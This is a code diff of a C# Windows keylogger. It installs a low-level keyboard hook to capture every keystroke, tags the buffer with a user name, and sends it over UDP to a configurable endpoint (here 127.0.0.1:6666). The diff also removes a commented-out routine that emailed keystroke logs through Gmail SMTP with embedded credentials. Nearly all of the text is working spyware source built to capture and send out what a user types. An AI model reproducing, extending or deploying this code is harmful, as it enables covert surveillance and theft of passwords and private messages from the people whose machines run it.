@@ -3,8 +3,10 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.IO;
-using System.Net.Mail;
+using System.Net.Sockets;
 using System.Net;
+using System.Text;
+
 using static System.Net.Mime.MediaTypeNames;
 
 namespace Keylog { 
@@ -13,62 +15,63 @@ namespace Keylog {
     public class Keylog_exe
 	{
         // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //
-        /*private const string FROM_EMAIL_ADDRESS = "josh.cyber.te@gl.com";
-        private const string FROM_EMAIL_PASSWORD = "dongintome";
-        private const string TO_EMAIL_ADDRESS = "josh.cyber.test@g.com";*/
-        private const string LOG_FILE_NAME = @"C:\Users\Baptiste\Desktop\test_keylog\mylog.txt";
-        /*private const string ARCHIVE_FILE_NAME = @"C:\Users\Baptiste\Desktop\test_keylog\mylog_archive.txt";
-        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
-        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;*/
-        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
+        
+        
     // ----------------------------- END -------------------------------- //
 
-
-        private static int WH_KEYBOARD_LL = 13;
-        private static int WM_KEYDOWN = 0x0100;
-        private static IntPtr hook = IntPtr.Zero;
+        public static string user_name;
+        private static int WH_KEYBOARD_LL;
+        private static int WM_KEYDOWN ;
+        private static IntPtr hook;
         public static LowLevelKeyboardProc llkProcedure = HookCallback;
         private static string buffer = "";
+        
 
         public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        public Keylog_exe(string name)
+        {
+            user_name = name;
+            WH_KEYBOARD_LL = 13;
+            WM_KEYDOWN = 0x0100;
+            hook = IntPtr.Zero;
+            buffer = name+";";
+            
+        }
 
 
+        static int getLenght_byte(byte[] b)
+        {
+            int a  = 0;
+            foreach(byte elem in b)
+            {
+                a++;
+            }
+            return a;
+        }
 
         public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
+            string name = user_name;
 
-            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
+            if(buffer.Length >= 50 + name.Length)
             {
-                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
-                output.Write(buffer);
-                output.Close();
-                buffer = "";
+                /* envoie du fichier*/
+                UdpClient client  = new UdpClient();
+                IPEndPoint ep = new IPEndPoint(IPAddress.Parse("127.0.0.1"),6666);
+                client.Connect(ep);
+                byte[] b = Encoding.ASCII.GetBytes(buffer);
+                client.Send(b,getLenght_byte(b));
+                /*------------------*/
+
+               
+                buffer = name+";";
             }
+            
 
-            FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");
 
-            // Archive and email the log file if the max size has been reached
-            /*if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
-            {
-                try
-                {
-                    // Copy the log file to the archive
-                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);
 
-                    // Delete the log file
-                    logFile.Delete();
 
-                    // Email the archive and send email using a new thread
-                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
-                    Console.Out.WriteLine("\n\n**MAILSENDING**\n");
-                    mailThread.Start();
-                }
-                catch (Exception e)
-                {
-                    Console.Out.WriteLine(e.Message);
-                }
-            }*/
 
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
@@ -98,54 +101,7 @@ namespace Keylog {
             return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
         }
 
-        /*public static void sendMail()
-        {
-            try
-            {
-                // Read the archive file contents into the email body variable
-                StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
-                string emailBody = input.ReadToEnd();
-                input.Close();
-
-                // Create the email client object
-                SmtpClient client = new SmtpClient("smtp.gmail.com")
-                {
-                    Port = 587,
-                    DeliveryMethod = SmtpDeliveryMethod.Network,
-                    UseDefaultCredentials = false,
-                    Credentials = new NetworkCredential(FROM_EMAIL_ADDRESS, FROM_EMAIL_PASSWORD),
-                    EnableSsl = true,
-                };
-
-                // Build the email message
-                MailMessage message = new MailMessage
-                {
-                    From = new MailAddress(FROM_EMAIL_ADDRESS),
-                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
-                    Body = emailBody,
-                    IsBodyHtml = false,
-                };
-
-                if (INCLUDE_LOG_AS_ATTACHMENT)
-                {
-                    Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
-                    message.Attachments.Add(attachment);
-                }
-
-                // Set the recipient
-                message.To.Add(TO_EMAIL_ADDRESS);
-
-                // Send the message
-                client.Send(message);
-
-                // Release resources used by the msssage (archive file)
-                message.Dispose();
-            }
-            catch (Exception e)
-            {
-                Console.Out.WriteLine(e.Message);
-            }
-        }*/
+        
 
         public static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
